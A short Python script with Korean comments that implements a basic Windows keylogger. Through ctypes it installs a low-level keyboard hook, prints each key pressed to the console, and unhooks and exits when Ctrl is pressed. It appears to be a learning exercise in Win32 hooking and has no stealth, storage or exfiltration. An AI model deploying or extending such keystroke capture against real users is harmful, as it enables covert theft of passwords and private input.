import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

# Win32 API 호출
gUser32 = windll.user32
gKernel32 = windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162

class KeyLogger:
    def __init__( self ):
        self.mUser32 = gUser32
        self.mHooked = None

    def installhockProc( self, aPtr ):
        self.mHooked = self.mUser32.SetWindowsHookExA(
            WH_KEYBOARD_LL, # 훅 타입
            aPtr, # 훅 프로시저
            gKernel32.GetModuleHandleW( None ), # 후킹할 스레드가 속해있는 DLL 의 핸들
            0 # 후킹할 스레드 아이디
        )

        if not self.mHooked:
            return False

        return True

    def uninstallHookProc( self ):
        if self.mHooked is None:
            return
        
        self.mUser32.UnhookWindowsHookEx( self.mHooked )
        self.mHooked = None

# 훅 프로시저를 등록하기 위한 함수의 포인터를 얻어온다.
def getFPTR( aFunc ):
    CMPFUNC = CFUNCTYPE( c_int, c_int, c_int, POINTER( c_void_p ) )
    return CMPFUNC( aFunc )
        
# 훅 프로시저를 정의한다.
def hookProc( aNCode, aWParam, aLParam ):
    if aWParam is not WM_KEYDOWN:
        # 처리가 끝나면 훅 체인에 있는 다른 훅 프로시저에게 제어권을 넘겨준다.
        return gUser32.CallNextHookEx( gKeyLogger.mHooked, aNCode, aWParam, aLParam )

    sHookedKey = chr( aLParam[0] )
    print( sHookedKey )

    if ( CTRL_CODE == int( aLParam[0] ) ):
        print( "Ctrl pressed, call uninstallHook()" )
        gKeyLogger.uninstallHookProc()
        print( "exit" )
        sys.exit( -1 )

    return gUser32.CallNextHookEx( gKeyLogger.mHooked, aNCode, aWParam, aLParam )

# 메시지 전달
def startKeyLog():
    sMsg = MSG()
    gUser32.GetMessageA( byref( sMsg ), 0, 0, 0 )


gKeyLogger = KeyLogger() # start of hook process
sPtr = getFPTR( hookProc )

if gKeyLogger.installhockProc( sPtr ):
    print( "installed keyLogger" )

startKeyLog()
    
